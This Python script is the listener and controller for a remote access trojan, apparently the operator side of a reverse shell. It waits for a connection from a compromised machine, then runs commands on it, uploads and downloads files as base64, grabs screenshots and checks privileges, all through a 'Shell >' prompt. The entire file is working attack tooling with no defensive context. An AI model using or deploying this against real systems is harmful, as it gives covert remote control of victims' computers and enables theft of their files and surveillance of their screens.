import socket
import os
import base64
from datetime import datetime
import argparse

def receive_all(sock, buffer_size=4096):
    data = b""
    while True:
        part = sock.recv(buffer_size)
        if part.endswith(b"ENDOFFILE"):
            data += part[:-9]
            break
        data += part
    return data

def connect(args):
    print(f"[+] Starting server on port {args.port}...")
    server_socket = socket.socket()
    server_socket.bind((args.host, args.port))
    server_socket.listen(1)
    connection, address = server_socket.accept()
    print(f"[+] Connection from {address}")

    print(connection.recv(1024).decode())
    print("[+] Type 'help' to see commands")

    while True:
        try:
            command = input("Shell > ")

            if command == "help":
                print("""
Commands:
  pwd                     - Get current directory
  ls                      - List files
  cd <dir>                - Change directory
  checkadmin              - Check privileges
  upload <local> <remote> - Send file to target
  download <remote> <local> - Get file from target
  screenshot              - Capture screenshot from target
  terminate               - Exit
""")
                continue

            if command == "terminate":
                connection.send(command.encode())
                break

            elif command.startswith("upload "):
                _, local, remote = command.split(maxsplit=2)
                if not os.path.exists(local):
                    print("[!] File not found.")
                    continue
                with open(local, "rb") as f:
                    encoded = base64.b64encode(f.read()).decode()
                connection.send(f"upload {remote} {encoded}".encode())
                print(connection.recv(1024).decode())

            elif command.startswith("download "):
                _, remote, local = command.split(maxsplit=2)
                connection.send(f"download {remote}".encode())
                response = connection.recv(1024).decode()
                if response.startswith("[!]"):
                    print(response)
                    continue
                print(response)
                data = receive_all(connection)
                decoded = base64.b64decode(data)
                with open(local, "wb") as f:
                    f.write(decoded)
                print(f"[+] File saved to {local}")

            elif command == "screenshot":
                connection.send(command.encode())
                data = receive_all(connection)
                filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                with open(filename, "wb") as f:
                    f.write(data)
                print(f"[+] Screenshot saved as {filename}")

            else:
                connection.send(command.encode())
                print(connection.recv(4096).decode())

        except Exception as e:
            print(f"[!] Error: {e}")
            break

    connection.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Remote Access Server")
    parser.add_argument("--host", default="0.0.0.0", help="Interface to listen on")
    parser.add_argument("--port", type=int, default=8080, help="Port to listen on")
    args = parser.parse_args()
    connect(args)